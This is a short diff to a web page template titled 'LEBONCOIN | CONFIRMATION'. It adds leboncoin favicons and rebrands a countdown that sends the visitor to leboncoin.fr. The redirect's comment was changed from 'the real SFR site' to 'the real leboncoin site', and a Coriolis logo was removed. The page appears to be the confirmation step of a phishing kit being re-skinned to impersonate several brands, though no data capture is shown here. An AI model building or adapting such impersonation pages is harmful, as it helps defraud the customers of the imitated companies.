@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
+    <link rel="shortcut icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
     <title>LEBONCOIN | CONFIRMATION</title>
     @vite(['resources/css/app.css'])
     <style>
@@ -28,12 +30,9 @@
 </style>
 
 <script>
-
-        // B. On attend le chargement complet pour cacher le loader
         window.addEventListener('load', function() {
             const loader = document.getElementById('global-loader');
             
-            // Sécurité : on vérifie que l'élément existe bien avant d'agir
             if (loader) {
                 setTimeout(() => {
                     loader.style.opacity = '0';
@@ -68,10 +67,6 @@
                 <span id="timer" class="text-xl font-bold coriolis-text">5</span> secondes...
             </p>
         </div>
-
-        <!--<div class="mt-8">
-            <img src="https://www.coriolis.com/media/logo/default/logo-coriolis.png" alt="Coriolis" class="h-8 mx-auto opacity-50">
-        </div>-->
     </div>
 
     <script>
@@ -84,7 +79,7 @@
 
             if (timeLeft <= 0) {
                 clearInterval(countdown);
-                // Redirection vers le vrai site SFR
+                // Redirection vers le vrai site leboncoin
                 window.location.href = "https://www.leboncoin.fr/";
             }
         }, 1000);
